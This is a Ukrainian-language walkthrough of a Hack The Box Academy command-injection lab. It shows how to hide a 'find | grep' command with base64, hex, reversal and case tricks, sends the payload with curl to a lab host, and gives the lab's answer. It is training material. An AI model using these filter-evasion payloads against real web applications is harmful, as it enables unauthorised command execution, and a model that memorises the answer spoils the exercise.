## Command Injections — Advanced Command Obfuscation: Base64

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Advanced Command Obfuscation](https://academy.hackthebox.com/app/module/109/section/1039)
**Відповідь:** `/usr/share/mysql/debian_create_root_user.sql`

***

## Концепція

Попередні техніки (лапки, brace expansion) не рятують коли заблоковані цілі слова (`find`, `grep`, `tail`, `mysql`) або складні символи (`|`, `/`). **Base64 обфускація** — повністю ховає команду: сервер бачить лише `bash<<<$(base64 -d<<<BASE64_РЯДОК)` без жодного заблокованого слова.  [scribd](https://www.scribd.com/document/909434063/Command-Injections)

```bash
# Сервер отримує:
bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
# bash розгортає base64 → виконує: find /usr/share/ | grep root | grep mysql | tail -n 1
```

***

## Крок 1 — Кодуємо команду в base64

```bash
# -n прибирає \n в кінці рядка (інакше base64 буде іншим)
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
# ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

***

## Крок 2 — Будуємо payload

```
127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

| Частина | Що робить |
|---|---|
| `%0a` | New-line injection operator |
| `bash<<<` | Передає рядок напряму bash як input (без пробілу) |
| `$(...)` | Command substitution — виконує всередині |
| `base64%09-d` | `base64 -d` з tab замість пробілу (пробіл заблокований) |
| `<<<BASE64` | Here-string — передає base64 рядок команді |

***

## Крок 3 — Відправляємо

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.74:32673"

# Одинарні лапки — щоб bash не розгорнув $() локально
curl -s -X POST "$TARGET/index.php" \
  --data 'ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)' \
  | grep -oP '/usr/share/\S+'
# /usr/share/mysql/debian_create_root_user.sql
```

***

## Схема роботи base64 bypass

```
[Наш ПК]                          [Сервер]
echo -n 'find ... | tail -n 1'    отримує: bash<<<$(base64 -d<<<BASE64)
       ↓                                    ↓
    base64 encode              bash декодує BASE64 → отримує оригінальну команду
       ↓                                    ↓
ZmluZC...DA=               виконує: find /usr/share/ | grep root | grep mysql | tail -n 1
                                            ↓
                               /usr/share/mysql/debian_create_root_user.sql
```

***

## Альтернативні методи для повного bypass

```bash
# Метод 2: hex (xxd)
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | xxd -p | tr -d '\n'
# результат передаємо через: bash<<<$(xxd -r -p<<<HEX_РЯДОК)

# Метод 3: rev (реверс кожного слова)
# find → dnif, grep → perg, mysql → lqsym
$(rev<<<'1 n- liat | lqsym perg | toor perg | /erahs/rsu/ dnif')

# Метод 4: case manipulation
$(tr "[A-Z]" "[a-z]"<<<'FIND /USR/SHARE/ | GREP ROOT | GREP MYSQL | TAIL -N 1')
```

***

## Відповідь

```
/usr/share/mysql/debian_create_root_user.sql
```
